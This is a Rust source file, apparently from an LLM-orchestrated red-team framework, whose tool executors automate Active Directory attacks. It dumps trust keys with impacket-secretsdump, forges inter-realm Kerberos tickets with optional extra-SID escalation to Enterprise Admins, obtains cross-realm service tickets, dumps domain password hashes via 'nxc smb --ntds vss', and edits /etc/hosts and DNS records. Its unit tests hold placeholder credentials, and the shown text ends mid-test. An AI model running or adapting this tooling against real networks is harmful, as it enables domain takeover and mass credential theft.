//! Trust / cross-forest tool executors.

use anyhow::{Context, Result};
use serde_json::Value;

use crate::args::{optional_str, required_str};
use crate::credentials;
use crate::executor::CommandBuilder;
use crate::ToolOutput;

/// Embedded Python helper that does a cross-realm TGS-REQ using a forged
/// inter-realm TGT. See `forge_inter_realm_and_dump` for why this exists.
const CROSS_REALM_TGS_HELPER: &str = include_str!("cross_realm_tgs.py");

/// Idempotently ensure `/etc/hosts` contains an `<ip> <hostname>` mapping so
/// callers using FQDNs (Kerberos SPN match) can resolve them on a worker that
/// has no DNS path to the lab forest. Reads the current file, returns Ok if
/// any line already maps the hostname to the given IP, otherwise appends a
/// new entry. The append is racy across concurrent runs but a duplicate line
/// is harmless and `getaddrinfo` returns the first match, so we don't lock.
///
/// Errors are surfaced — failing to write `/etc/hosts` would leave the caller
/// to silently fail at `nxc` time, which is exactly the symptom we're fixing.
pub(super) fn ensure_hosts_entry(ip: &str, hostname: &str) -> Result<()> {
    use std::io::Write as _;
    let path = "/etc/hosts";
    let current = std::fs::read_to_string(path)
        .with_context(|| format!("failed to read {path} for hostname mapping"))?;
    let needle = format!(" {hostname} ");
    let needle_eol = format!(" {hostname}\n");
    for line in current.lines() {
        if line.trim_start().starts_with('#') {
            continue;
        }
        let padded = format!(" {line} \n");
        if padded.contains(&needle) || padded.contains(&needle_eol) {
            let mut fields = line.split_whitespace();
            if fields.next() == Some(ip) && fields.any(|f| f.eq_ignore_ascii_case(hostname)) {
                return Ok(());
            }
        }
    }
    let mut f = std::fs::OpenOptions::new()
        .append(true)
        .open(path)
        .with_context(|| format!("failed to open {path} for hostname mapping"))?;
    writeln!(f, "{ip} {hostname}").with_context(|| format!("failed to append to {path}"))?;
    Ok(())
}

/// Extract trust keys by dumping secrets for a trusted domain's machine account.
///
/// Required args: `domain`, `username`, `dc_ip`, `trusted_domain`
/// Auth: `password` (plaintext) OR `hash` (NTLM pass-the-hash). At least one
/// non-empty value required — empty `password` would trigger an interactive
/// `getpass()` prompt inside impacket-secretsdump and EOF the agent's stdin.
pub async fn extract_trust_key(args: &Value) -> Result<ToolOutput> {
    let domain = required_str(args, "domain")?;
    let username = required_str(args, "username")?;
    let password = optional_str(args, "password").filter(|s| !s.is_empty());
    let hash = optional_str(args, "hash").filter(|s| !s.is_empty());
    let dc_ip = required_str(args, "dc_ip")?;
    let trusted_domain = required_str(args, "trusted_domain")?;

    if password.is_none() && hash.is_none() {
        anyhow::bail!(
            "extract_trust_key requires non-empty 'password' or 'hash' for authentication"
        );
    }

    let (target_str, extra_args) =
        credentials::impacket_auth(Some(domain), username, password, hash, dc_ip);

    let just_dc_user = format!("{trusted_domain}$");

    CommandBuilder::new("impacket-secretsdump")
        .arg(target_str)
        .args(extra_args)
        .flag("-just-dc-user", just_dc_user)
        .timeout_secs(120)
        .execute()
        .await
}

/// Create an inter-realm / cross-forest Kerberos ticket using impacket-ticketer.
///
/// Required args: `trust_key`, `source_sid`, `source_domain`, `target_sid`,
///                `target_domain`
/// Optional args: `username`, `extra_sid`, `aes_key`
///
/// For child-to-parent escalation (same forest), pass `extra_sid` with the
/// parent domain Enterprise Admins SID (e.g. `S-1-5-21-…-519`).
/// For cross-forest trusts, omit `extra_sid` — SID filtering blocks RIDs < 1000.
///
/// When `aes_key` is supplied, prefer it over the NT hash — Win2016+ KDCs
/// validate AES256 inter-realm tickets without RC4. impacket-ticketer rejects
/// both flags simultaneously ("Pick only one" — exits without writing a ccache),
/// so we choose AES when available and fall back to NT hash otherwise. NT-only
/// tickets validate against dc01.fabrikam.local in the lab — verified
/// working for cross-realm bloodyAD LDAP bind.
pub async fn create_inter_realm_ticket(args: &Value) -> Result<ToolOutput> {
    let trust_key = required_str(args, "trust_key")?;
    let source_sid = required_str(args, "source_sid")?;
    let source_domain = required_str(args, "source_domain")?;
    // target_sid unused by ticketer but accepted for schema parity with
    // forge_inter_realm_and_dump; ticketer derives the realm from -domain.
    let _target_sid = optional_str(args, "target_sid");
    let target_domain = required_str(args, "target_domain")?;
    let username = optional_str(args, "username").unwrap_or("Administrator");
    let extra_sid = optional_str(args, "extra_sid");
    let aes_key = optional_str(args, "aes_key").filter(|s| !s.is_empty());
    // Optional service-ticket pre-fetch params. When supplied, after forging
    // the inter-realm TGT we chain cross_realm_tgs.py to also obtain
    // ldap/<target_dc_fqdn> and cifs/<target_dc_fqdn> service tickets,
    // appended into the same ccache. This is required because MIT GSSAPI
    // clients (e.g. `ldapsearch -Y GSSAPI`) cannot walk a referral starting
    // from `krbtgt/<TARGET>@<SOURCE>` — they need a service-ticket entry
    // already present. Without these, the inter-realm TGT is unusable for
    // ldapsearch even though it is a valid Kerberos credential.
    let target_dc_fqdn = optional_str(args, "target_dc_fqdn").filter(|s| !s.is_empty());
    let target_dc_ip = optional_str(args, "target_dc_ip").filter(|s| !s.is_empty());

    let spn = format!("krbtgt/{target_domain}");
    // -nthash expects a 32-char hex NT hash. LLMs frequently pass the
    // concatenated `LM:NT` form harvested from secretsdump output, which
    // ticketer rejects with `'Odd-length string'`. Strip to NT half.
    let nt = credentials::nt_hash_only(trust_key);

    // Write to a deterministic per-operation directory under /tmp so downstream
    // tools on the same host can consume the ccache without knowing the CWD at
    // ticket-forge time. The path is deterministic: no race between concurrent
    // forge calls for different (source, target, user) triples.
    let ticket_dir = std::path::PathBuf::from("/tmp/ares-tickets");
    let _ = std::fs::create_dir_all(&ticket_dir);
    let safe_src = source_domain.replace('.', "_");
    let safe_tgt = target_domain.replace('.', "_");
    let ccache_name = format!("{safe_src}__{safe_tgt}__{username}.ccache");
    let ccache_path = ticket_dir.join(&ccache_name);

    // impacket-ticketer "Pick only one" — when we plan to chain cross_realm_tgs
    // (target_dc_fqdn + target_dc_ip both present), force NT-only.
    // impacket has a salt-derivation bug on trust accounts: tickets forged with
    // -aesKey produce KRB_AP_ERR_BAD_INTEGRITY when used as TGT input to a
    // subsequent cross-realm getKerberosTGS call. NT-only avoids the bad salt
    // path. When the chain is NOT requested (no target_dc_*), AES is fine for
    // the TGT alone (LDAP-bind callers can use it directly).
    let chain_requested = target_dc_fqdn.is_some() && target_dc_ip.is_some();
    let mut cmd = CommandBuilder::new("impacket-ticketer")
        .flag("-domain-sid", source_sid)
        .flag("-domain", source_domain);

    if chain_requested {
        cmd = cmd.flag("-nthash", nt);
    } else if let Some(aes) = aes_key {
        cmd = cmd.flag("-aesKey", aes);
    } else {
        cmd = cmd.flag("-nthash", nt);
    }

    if let Some(es) = extra_sid {
        cmd = cmd.flag("-extra-sid", es);
    }

    // Run in ticket_dir so impacket-ticketer writes <username>.ccache there,
    // then rename to the deterministic ccache_path.
    let mut output = cmd
        .flag("-spn", spn)
        .arg(username)
        .current_dir(&ticket_dir)
        .timeout_secs(120)
        .execute()
        .await?;

    // impacket-ticketer writes `<username>.ccache` in cwd. Rename to our
    // deterministic path (handles the common case where username is "Administrator").
    let default_ccache = ticket_dir.join(format!("{username}.ccache"));
    if default_ccache.exists() && default_ccache != ccache_path {
        let _ = std::fs::rename(&default_ccache, &ccache_path);
    }

    // Optionally chain cross_realm_tgs.py to fetch ldap/<dc> and cifs/<dc>
    // service tickets and append them to the same ccache. This turns the
    // otherwise-unusable inter-realm TGT into a ccache that
    // `ldapsearch -Y GSSAPI` can consume directly.
    if ccache_path.exists() {
        if let (Some(dc_fqdn), Some(dc_ip)) = (target_dc_fqdn, target_dc_ip) {
            let helper_path = ticket_dir.join("cross_realm_tgs.py");
            if let Err(e) = std::fs::write(&helper_path, CROSS_REALM_TGS_HELPER) {
                output.stdout.push_str(&format!(
                    "\n[!] failed to write cross_realm_tgs helper: {e}\n"
                ));
            } else {
                for spn in [format!("ldap/{dc_fqdn}"), format!("cifs/{dc_fqdn}")] {
                    let res = CommandBuilder::new("python3")
                        .arg(helper_path.to_string_lossy().into_owned())
                        .flag("--in-ccache", ccache_path.to_string_lossy().into_owned())
                        .flag("--out-ccache", ccache_path.to_string_lossy().into_owned())
                        .flag("--spn", &spn)
                        .flag("--source-realm", source_domain.to_uppercase())
                        .flag("--target-realm", target_domain.to_uppercase())
                        .flag("--target-kdc", dc_ip)
                        .arg("--append")
                        .current_dir(&ticket_dir)
                        .timeout_secs(120)
                        .execute()
                        .await;
                    match res {
                        Ok(svc_out) => {
                            output.stdout.push_str(&format!(
                                "\n=== service ticket {spn} ===\n{}\n{}\n",
                                svc_out.stdout, svc_out.stderr
                            ));
                            if !svc_out.success {
                                output.stdout.push_str(&format!(
                                    "[!] service ticket fetch for {spn} failed (exit {:?})\n",
                                    svc_out.exit_code
                                ));
                            }
                        }
                        Err(e) => {
                            output.stdout.push_str(&format!(
                                "\n[!] service ticket fetch for {spn} errored: {e}\n"
                            ));
                        }
                    }
                }

                let certipy_ccache = certipy_ccache_path_for(&ccache_path);
                let res = CommandBuilder::new("python3")
                    .arg(helper_path.to_string_lossy().into_owned())
                    .flag("--in-ccache", ccache_path.to_string_lossy().into_owned())
                    .flag(
                        "--out-ccache",
                        certipy_ccache.to_string_lossy().into_owned(),
                    )
                    .flag("--target-realm", target_domain.to_uppercase())
                    .arg("--rehome-realm")
                    .current_dir(&ticket_dir)
                    .timeout_secs(60)
                    .execute()
                    .await;
                match res {
                    Ok(rehome_out) => {
                        output.stdout.push_str(&format!(
                            "\n=== certipy ccache re-home ===\n{}\n{}\n",
                            rehome_out.stdout, rehome_out.stderr
                        ));
                    }
                    Err(e) => {
                        output
                            .stdout
                            .push_str(&format!("\n[!] certipy ccache re-home errored: {e}\n"));
                    }
                }
            }
        }
    }

    // Write a companion krb5.conf shim alongside the ccache. Without
    // `[domain_realm]` mappings for `.<target_domain>`, MIT libkrb5 falls
    // back to `default_realm` (`EC2.INTERNAL` on the ares AMI) when
    // resolving `ldap/<target-dc>` and misses the cached service ticket
    // with `Matching credential not found` — every cross-forest GSSAPI
    // call fails despite a valid ccache. Every wrapper that sets
    // `KRB5CCNAME=<ccache>` also sets `KRB5_CONFIG=<ccache>.krb5.conf:
    // /etc/krb5.conf`, so the shim only affects GSSAPI calls that carry
    // this ccache.
    if ccache_path.exists() {
        let shim = build_krb5_shim(&[
            (source_domain.to_string(), source_domain.to_uppercase()),
            (target_domain.to_string(), target_domain.to_uppercase()),
        ]);
        let certipy_ccache = certipy_ccache_path_for(&ccache_path);
        let shim_targets = [
            Some(krb5_shim_path_for(&ccache_path)),
            certipy_ccache
                .exists()
                .then(|| krb5_shim_path_for(&certipy_ccache)),
        ];
        for shim_path in shim_targets.into_iter().flatten() {
            if let Err(e) = std::fs::write(&shim_path, &shim) {
                output.stdout.push_str(&format!(
                    "\n[!] failed to write krb5.conf shim at {}: {e}\n",
                    shim_path.display()
                ));
            }
        }
    }

    // Append the ticket path to stdout so the orchestrator can parse it.
    if ccache_path.exists() {
        output
            .stdout
            .push_str(&format!("\nARES_TICKET_PATH={}\n", ccache_path.display()));
    }

    Ok(output)
}

/// Path where the krb5.conf shim companion to `ccache_path` lives.
///
/// Convention: append `.krb5.conf` to the ccache path. Every consumer that
/// exports `KRB5CCNAME=<ccache>` also exports
/// `KRB5_CONFIG=<ccache>.krb5.conf:/etc/krb5.conf`. Colon fallback so a
/// missing shim doesn't nuke the system krb5.conf.
pub fn krb5_shim_path_for(ccache_path: &std::path::Path) -> std::path::PathBuf {
    let mut s = ccache_path.as_os_str().to_owned();
    s.push(".krb5.conf");
    std::path::PathBuf::from(s)
}

pub fn certipy_ccache_path_for(ccache_path: &std::path::Path) -> std::path::PathBuf {
    let mut s = ccache_path.as_os_str().to_owned();
    s.push(".certipy");
    std::path::PathBuf::from(s)
}

/// Build the krb5.conf content mapping each (domain, realm) pair through
/// `[domain_realm]`. `default_realm` is the first entry — the first entry
/// SHOULD be the source realm (the ccache's default principal's realm)
/// so MIT resolves unspecified realms to it. `dns_lookup_realm = false`
/// prevents MIT from trying DNS `_kerberos.<domain>` lookups that would
/// leak to the internet from the attacker host.
fn build_krb5_shim(entries: &[(String, String)]) -> String {
    let default_realm = entries
        .first()
        .map(|(_, r)| r.as_str())
        .unwrap_or("EMPTY.REALM");
    let mut out = String::new();
    out.push_str("# ares-managed krb5.conf shim — regenerated per ticket forge.\n");
    out.push_str("[libdefaults]\n");
    out.push_str(&format!("    default_realm = {default_realm}\n"));
    out.push_str("    dns_lookup_realm = false\n");
    out.push_str("    dns_lookup_kdc = false\n");
    out.push_str("    rdns = false\n");
    out.push_str("    forwardable = true\n\n");
    out.push_str("[domain_realm]\n");
    for (domain, realm) in entries {
        let d_lc = domain.to_lowercase();
        out.push_str(&format!("    .{d_lc} = {realm}\n"));
        out.push_str(&format!("    {d_lc} = {realm}\n"));
    }
    out
}

/// Forge an inter-realm Kerberos ticket, request a TGS for the target DC,
/// then run `nxc smb --ntds` against it — all in a single worker invocation.
///
/// This wraps the impacket forge-and-present workaround for the cross-realm
/// referral bug (fortra/impacket#315) into ONE deterministic tool call so
/// the orchestrator can dispatch every parameter directly, without laundering
/// the trust key / SIDs through an LLM. All three steps share a tempdir as
/// cwd so the ccache files produced are colocated on disk.
///
/// Why three steps and not two:
/// 1. **ticketer** forges the inter-realm TGT (krbtgt/<target> issued by
///    <source>) using the trust key. Forced to **NT-only** — impacket has a
///    salt-derivation bug on trust accounts that yields
///    `KRB_AP_ERR_BAD_INTEGRITY` whenever the AES key is supplied alongside
///    the NT hash. The NT-only ticket validates against modern KDCs.
/// 2. **`cross_realm_tgs.py`** (embedded helper) loads the inter-realm TGT
///    directly and calls `getKerberosTGS` against the target KDC for
///    `cifs/<target>`. We can't use `impacket-getST -k -no-pass` here:
///    impacket's `CCache.parseFile` only matches `krbtgt/<DOMAIN>@<DOMAIN>`
///    (intra-realm TGTs) so the inter-realm credential `krbtgt/<TARGET>@<SOURCE>`
///    is silently ignored. getST then falls through to no-pass auth that
///    returns `KDC_ERR_WRONG_REALM` with exit code 0, hiding the failure.
/// 3. **nxc smb --ntds** dumps NTDS using the TGS via Kerberos cache.
///    `impacket-secretsdump` is unusable here: its DRSUAPI bind rejects
///    cross-realm TGS auth with `Bind context rejected: invalid_checksum`.
///    netexec's `--ntds vss` path uses a different bind sequence that
///    accepts the cross-realm credential.
///
/// Required args: `trust_key`, `source_sid`, `source_domain`, `target_domain`,
///                `target` (DC hostname for cifs/<target> SPN matching)
/// Optional args: `target_sid` (kept for parity), `username` (default
///                "Administrator"), `extra_sid` (child→parent only — omit for
///                cross-forest), `dc_ip` (passed as -dc-ip and to nxc).
pub async fn forge_inter_realm_and_dump(args: &Value) -> Result<ToolOutput> {
    let trust_key = required_str(args, "trust_key")?;
    let source_sid = required_str(args, "source_sid")?;
    let source_domain = required_str(args, "source_domain")?;
    let target_domain = required_str(args, "target_domain")?;
    let target = required_str(args, "target")?;

    // Zone-apex guard: `target` is the host portion of `cifs/<target>` in the
    // TGS-REQ. If it equals the target realm (or is a bare 2-label domain
    // matching `target_domain`), the KDC has no service principal registered
    // there and returns KDC_ERR_S_PRINCIPAL_UNKNOWN. Fail fast so the dispatch
    // wrapper can lock dedup instead of clearing it and hot-looping.
    if target.eq_ignore_ascii_case(target_domain) {
        anyhow::bail!(
            "forge_inter_realm_and_dump: target ({target}) is the realm apex; caller must resolve a DC FQDN like dc01.{target_domain} before dispatch — bare-domain SPN cifs/{target_domain} is not registered and yields KDC_ERR_S_PRINCIPAL_UNKNOWN"
        );
    }
    // target_sid currently unused by ticketer but accepted for API parity
    // with create_inter_realm_ticket; ticketer derives the realm from -domain.
    let _target_sid = optional_str(args, "target_sid");
    let username = optional_str(args, "username")
        .unwrap_or("Administrator")
        .to_string();
    let extra_sid = optional_str(args, "extra_sid");
    let dc_ip = optional_str(args, "dc_ip");

    let nt = credentials::nt_hash_only(trust_key);

    let tempdir = tempfile::tempdir().context("failed to create tempdir for inter-realm forge")?;
    let cwd = tempdir.path().to_path_buf();

    let krbtgt_spn = format!("krbtgt/{target_domain}");
    let mut ticketer = CommandBuilder::new("impacket-ticketer")
        .flag("-nthash", nt)
        .flag("-domain-sid", source_sid)
        .flag("-domain", source_domain);
    if let Some(es) = extra_sid {
        ticketer = ticketer.flag("-extra-sid", es);
    }
    let ticketer_output = ticketer
        .flag("-spn", krbtgt_spn)
        .arg(&username)
        .current_dir(&cwd)
        .timeout_secs(120)
        .execute()
        .await?;

    if !ticketer_output.success {
        return Ok(ticketer_output);
    }

    let tgt_ccache = cwd.join(format!("{username}.ccache"));
    if !tgt_ccache.exists() {
        // ticketer exited 0 but no ccache landed on disk: a "Pick only one"
        // flag conflict, an odd-length/malformed hash, or a username/case
        // mismatch between our expected filename and the `Saving ticket in
        // <name>.ccache` line ticketer actually wrote. Surface ticketer's own
        // output so the reason is visible on attempt 1 instead of a bare "not
        // produced" that costs blind retries (same swallow as the ADCS req
        // path — see privesc/adcs.rs).
        anyhow::bail!(
            "impacket-ticketer exited 0 but {} was not produced — inter-realm TGT NOT forged. \
             ticketer stdout: {} || stderr: {}",
            tgt_ccache.display(),
            ticketer_output.stdout.trim(),
            ticketer_output.stderr.trim(),
        );
    }

    // Write the helper to the tempdir and invoke it. The helper opens the
    // forged inter-realm TGT, calls `getKerberosTGS` directly against the
    // target KDC, and writes the resulting TGS to a new ccache. See the
    // function docstring above for why we can't use `impacket-getST` here.
    let helper_path = cwd.join("cross_realm_tgs.py");
    std::fs::write(&helper_path, CROSS_REALM_TGS_HELPER)
        .context("failed to write cross_realm_tgs helper")?;

    let cifs_spn = format!("cifs/{target}");
    let tgs_ccache = cwd.join("cross_realm_tgs.ccache");
    let target_kdc = dc_ip.unwrap_or(target);

    let getst_output = CommandBuilder::new("python3")
        .arg(helper_path.to_string_lossy().into_owned())
        .flag("--in-ccache", tgt_ccache.to_string_lossy().into_owned())
        .flag("--out-ccache", tgs_ccache.to_string_lossy().into_owned())
        .flag("--spn", &cifs_spn)
        .flag("--source-realm", source_domain.to_uppercase())
        .flag("--target-realm", target_domain.to_uppercase())
        .flag("--target-kdc", target_kdc)
        .current_dir(&cwd)
        .timeout_secs(120)
        .execute()
        .await?;

    if !getst_output.success {
        return Ok(ToolOutput {
            stdout: format!(
                "=== impacket-ticketer ===\n{}\n=== cross_realm_tgs ===\n{}",
                ticketer_output.stdout, getst_output.stdout
            ),
            stderr: format!(
                "--- ticketer stderr ---\n{}\n--- cross_realm_tgs stderr ---\n{}",
                ticketer_output.stderr, getst_output.stderr
            ),
            exit_code: getst_output.exit_code,
            success: false,
        });
    }

    if !tgs_ccache.exists() {
        // Same swallow one step later: the helper exited 0 but wrote no TGS
        // ccache. Surface both the ticketer and helper output so the real
        // cause (KDC_ERR_S_PRINCIPAL_UNKNOWN from a bad SPN, KDC_ERR_WRONG_REALM,
        // or an unresolvable target KDC) is diagnosable instead of a bare "not
        // produced".
        anyhow::bail!(
            "cross_realm_tgs helper exited 0 but {} was not produced — cross-realm TGS NOT obtained. \
             ticketer stdout: {} || cross_realm_tgs stdout: {} || stderr: {}",
            tgs_ccache.display(),
            ticketer_output.stdout.trim(),
            getst_output.stdout.trim(),
            getst_output.stderr.trim(),
        );
    }

    // The cached TGS is bound to `cifs/{target}` where `target` is the FQDN
    // baked into the ticket by the cross-realm helper. nxc auto-builds its SPN from the
    // command-line target, so we MUST pass the FQDN here — passing the IP
    // would make nxc look up `cifs/<IP>` in the cache, miss, and silently
    // fall through with exit 0 / empty stdout.
    //
    // FQDN connect requires DNS, but on a stock Kali worker `/etc/resolv.conf`
    // points at AWS internal DNS which does not know the lab forest. Without
    // a hosts entry the socket-layer lookup fails before nxc can speak SMB,
    // and the same silent exit-0 failure mode shows up — masking real auth
    // outcomes from the orchestrator's krbtgt-observation check. Append an
    // `<ip> <fqdn>` line to `/etc/hosts` (the worker runs as root) so getaddrinfo
    // resolves cleanly. The append is idempotent — duplicate lines are harmless
    // and survive concurrent runs without locking.
    if let Some(ip) = dc_ip {
        ensure_hosts_entry(ip, target)?;
    }
    let dump_output = CommandBuilder::new("nxc")
        .arg("smb")
        .arg(target)
        .arg("-k")
        .arg("--use-kcache")
        .arg("--ntds")
        .arg("vss")
        .env("KRB5CCNAME", tgs_ccache.to_string_lossy().into_owned())
        .current_dir(&cwd)
        .timeout_secs(600)
        .execute()
        .await?;

    let stdout = format!(
        "=== impacket-ticketer ===\n{}\n=== cross_realm_tgs ===\n{}\n=== nxc smb --ntds ===\n{}",
        ticketer_output.stdout, getst_output.stdout, dump_output.stdout
    );
    let stderr = format!(
        "--- ticketer stderr ---\n{}\n--- cross_realm_tgs stderr ---\n{}\n--- nxc stderr ---\n{}",
        ticketer_output.stderr, getst_output.stderr, dump_output.stderr
    );
    Ok(ToolOutput {
        stdout,
        stderr,
        exit_code: dump_output.exit_code,
        success: dump_output.success,
    })
}

/// Look up domain SIDs using impacket-lookupsid.
///
/// Required args: `domain`, `username`, `dc_ip`
/// Auth: `password` (plaintext) OR `hash` (NTLM pass-the-hash). At least one required.
pub async fn get_sid(args: &Value) -> Result<ToolOutput> {
    let domain = required_str(args, "domain")?;
    let username = required_str(args, "username")?;
    let password = args
        .get("password")
        .and_then(|v| v.as_str())
        .filter(|s| !s.is_empty());
    let hash = args
        .get("hash")
        .and_then(|v| v.as_str())
        .filter(|s| !s.is_empty());
    let dc_ip = required_str(args, "dc_ip")?;

    if password.is_none() && hash.is_none() {
        anyhow::bail!("get_sid requires either 'password' or 'hash' for authentication");
    }

    let (target_str, extra_args) =
        credentials::impacket_auth(Some(domain), username, password, hash, dc_ip);

    CommandBuilder::new("impacket-lookupsid")
        .arg(target_str)
        .args(extra_args)
        .timeout_secs(120)
        .execute()
        .await
}

/// Manage DNS records using dnstool.py.
///
/// Required args: `domain`, `username`, `password`, `dc_ip`, `record_name`,
///                `record_data`
/// Optional args: `action` (defaults to "add")
pub async fn dnstool(args: &Value) -> Result<ToolOutput> {
    let domain = required_str(args, "domain")?;
    let username = required_str(args, "username")?;
    let password = required_str(args, "password")?;
    let dc_ip = required_str(args, "dc_ip")?;
    let record_name = required_str(args, "record_name")?;
    let record_data = required_str(args, "record_data")?;
    let action = optional_str(args, "action").unwrap_or("add");

    let user_spec = format!("{domain}\\{username}");

    CommandBuilder::new("dnstool")
        .flag("-dc-ip", dc_ip)
        .flag("-u", user_spec)
        .flag("-p", password)
        .flag("-a", action)
        .flag("-r", record_name)
        .flag("-d", record_data)
        .arg(dc_ip)
        .timeout_secs(120)
        .execute()
        .await
}

#[cfg(test)]
mod tests {
    use crate::args::{optional_str, required_str};
    use serde_json::json;

    // --- krb5 shim helpers ---

    #[test]
    fn krb5_shim_path_appends_krb5_conf_suffix() {
        let cc = std::path::PathBuf::from(
            "/tmp/ares-tickets/contoso_local__fabrikam_local__Administrator.ccache",
        );
        let shim = super::krb5_shim_path_for(&cc);
        assert_eq!(
            shim.to_string_lossy(),
            "/tmp/ares-tickets/contoso_local__fabrikam_local__Administrator.ccache.krb5.conf"
        );
    }

    #[test]
    fn certipy_ccache_path_appends_certipy_suffix() {
        let cc = std::path::PathBuf::from(
            "/tmp/ares-tickets/contoso_local__fabrikam_local__Administrator.ccache",
        );
        let certipy = super::certipy_ccache_path_for(&cc);
        assert_eq!(
            certipy.to_string_lossy(),
            "/tmp/ares-tickets/contoso_local__fabrikam_local__Administrator.ccache.certipy"
        );
        assert_ne!(certipy.extension().and_then(|e| e.to_str()), Some("ccache"));
    }

    #[test]
    fn certipy_ccache_gets_its_own_krb5_shim_path() {
        let cc = std::path::PathBuf::from(
            "/tmp/ares-tickets/contoso_local__fabrikam_local__Administrator.ccache",
        );
        let shim = super::krb5_shim_path_for(&super::certipy_ccache_path_for(&cc));
        assert_eq!(
            shim.to_string_lossy(),
            "/tmp/ares-tickets/contoso_local__fabrikam_local__Administrator.ccache.certipy.krb5.conf"
        );
    }

    #[test]
    fn krb5_shim_maps_every_domain_to_its_realm() {
        // Cross-forest case: source + target both listed under [domain_realm]
        // so MIT libkrb5 can resolve ldap/<target-dc> → TARGET.REALM and hit
        // the cached service ticket. default_realm is the first entry.
        let out = super::build_krb5_shim(&[
            ("contoso.local".into(), "CONTOSO.LOCAL".into()),
            ("fabrikam.local".into(), "FABRIKAM.LOCAL".into()),
        ]);
        assert!(
            out.contains("default_realm = CONTOSO.LOCAL"),
            "default_realm should be the first entry, got: {out}"
        );
        assert!(
            out.contains("dns_lookup_realm = false"),
            "must disable DNS realm lookup to prevent attacker-host DNS leaks"
        );
        for (want_domain, want_realm) in [
            ("contoso.local", "CONTOSO.LOCAL"),
            ("fabrikam.local", "FABRIKAM.LOCAL"),
        ] {
            assert!(
                out.contains(&format!(".{want_domain} = {want_realm}")),
                "missing wildcard domain_realm entry `.{want_domain} = {want_realm}` in: {out}"
            );
            assert!(
                out.contains(&format!("{want_domain} = {want_realm}")),
                "missing exact domain_realm entry `{want_domain} = {want_realm}` in: {out}"
            );
        }
    }

    // --- extract_trust_key ---

    #[test]
    fn extract_trust_key_missing_trusted_domain() {
        let args = json!({
            "domain": "contoso.local",
            "username": "admin",
            "password": "P@ssw0rd!",
            "dc_ip": "192.168.58.10"
        });
        assert!(required_str(&args, "trusted_domain").is_err());
    }

    #[test]
    fn extract_trust_key_missing_dc_ip() {
        let args = json!({
            "domain": "contoso.local",
            "username": "admin",
            "password": "P@ssw0rd!",
            "trusted_domain": "child.contoso.local"
        });
        assert!(required_str(&args, "dc_ip").is_err());
    }

    #[test]
    fn extract_trust_key_just_dc_user_format() {
        let args = json!({
            "domain": "contoso.local",
            "username": "admin",
            "password": "P@ssw0rd!",
            "dc_ip": "192.168.58.10",
            "trusted_domain": "child.contoso.local"
        });
        let trusted_domain = required_str(&args, "trusted_domain").unwrap();
        let just_dc_user = format!("{trusted_domain}$");
        assert_eq!(just_dc_user, "child.contoso.local$");
    }

    // --- create_inter_realm_ticket ---

    #[test]
    fn create_inter_realm_ticket_missing_trust_key() {
        let args = json!({
            "source_sid": "S-1-5-21-111",
            "source_domain": "child.contoso.local",
            "target_sid": "S-1-5-21-222",
            "target_domain": "contoso.local"
        });
        assert!(required_str(&args, "trust_key").is_err());
    }

    #[test]
    fn create_inter_realm_ticket_missing_source_sid() {
        let args = json!({
            "trust_key": "aabbccdd",
            "source_domain": "child.contoso.local",
            "target_sid": "S-1-5-21-222",
            "target_domain": "contoso.local"
        });
        assert!(required_str(&args, "source_sid").is_err());
    }

    #[test]
    fn create_inter_realm_ticket_extra_sid_optional() {
        // Without extra_sid — cross-forest case
        let args = json!({
            "trust_key": "aabbccdd",
            "source_sid": "S-1-5-21-111",
            "source_domain": "child.contoso.local",
            "target_sid": "S-1-5-21-222",
            "target_domain": "contoso.local"
        });
        assert!(optional_str(&args, "extra_sid").is_none());
    }

    #[test]
    fn create_inter_realm_ticket_extra_sid_child_to_parent() {
        // With extra_sid — child-to-parent case
        let args = json!({
            "trust_key": "aabbccdd",
            "source_sid": "S-1-5-21-111",
            "source_domain": "child.contoso.local",
            "target_sid": "S-1-5-21-222",
            "target_domain": "contoso.local",
            "extra_sid": "S-1-5-21-222-519"
        });
        assert_eq!(optional_str(&args, "extra_sid"), Some("S-1-5-21-222-519"));
    }

    #[test]
    fn create_inter_realm_ticket_spn_format() {
        let args = json!({
            "trust_key": "aabbccdd",
            "source_sid": "S-1-5-21-111",
            "source_domain": "child.contoso.local",
            "target_sid": "S-1-5-21-222",
            "target_domain": "contoso.local"
        });
        let target_domain = required_str(&args, "target_domain").unwrap();
        let spn = format!("krbtgt/{target_domain}");
        assert_eq!(spn, "krbtgt/contoso.local");
    }

    #[test]
    fn create_inter_realm_ticket_username_default() {
        let args = json!({
            "trust_key": "aabbccdd",
            "source_sid": "S-1-5-21-111",
            "source_domain": "child.contoso.local",
            "target_sid": "S-1-5-21-222",
            "target_domain": "contoso.local"
        });
        let username = optional_str(&args, "username").unwrap_or("Administrator");
        assert_eq!(username, "Administrator");
    }

    #[test]
    fn create_inter_realm_ticket_username_custom() {
        let args = json!({
            "trust_key": "aabbccdd",
            "source_sid": "S-1-5-21-111",
            "source_domain": "child.contoso.local",
            "target_sid": "S-1-5-21-222",
            "target_domain": "contoso.local",
            "username": "fakeuser"
        });
        let username = optional_str(&args, "username").unwrap_or("Administrator");
        assert_eq!(username, "fakeuser");
    }

    // --- get_sid ---

    #[test]
    fn get_sid_missing_domain() {
        let args = json!({
            "username": "admin",
            "password": "P@ssw0rd!",
            "dc_ip": "192.168.58.10"
        });
        assert!(required_str(&args, "domain").is_err());
    }

    #[test]
    fn get_sid_missing_username() {
        let args = json!({
            "domain": "contoso.local",
            "password": "P@ssw0rd!",
            "dc_ip": "192.168.58.10"
        });
        assert!(required_str(&args, "username").is_err());
    }

    #[test]
    fn get_sid_missing_password_and_hash() {
        let args = json!({
            "domain": "contoso.local",
            "username": "admin",
            "dc_ip": "192.168.58.10"
        });
        let rt = tokio::runtime::Runtime::new().unwrap();
        let result = rt.block_on(super::get_sid(&args));
        assert!(result.is_err());
        assert!(result
            .unwrap_err()
            .to_string()
            .contains("get_sid requires either 'password' or 'hash'"));
    }

    #[test]
    fn get_sid_empty_password_and_hash_still_errors() {
        let args = json!({
            "domain": "contoso.local",
            "username": "admin",
            "dc_ip": "192.168.58.10",
            "password": "",
            "hash": ""
        });
        let rt = tokio::runtime::Runtime::new().unwrap();
        let result = rt.block_on(super::get_sid(&args));
        assert!(result.is_err());
        assert!(result
            .unwrap_err()
            .to_string()
            .contains("get_sid requires either 'password' or 'hash'"));
    }

    #[test]
    fn get_sid_with_password_present() {
        let args = json!({
            "domain": "contoso.local",
            "username": "admin",
            "password": "P@ssw0rd!",
            "dc_ip": "192.168.58.10"
        });
        let password = args
            .get("password")
            .and_then(|v| v.as_str())
            .filter(|s| !s.is_empty());
        assert_eq!(password, Some("P@ssw0rd!"));
    }

    #[test]
    fn get_sid_with_hash_present() {
        let args = json!({
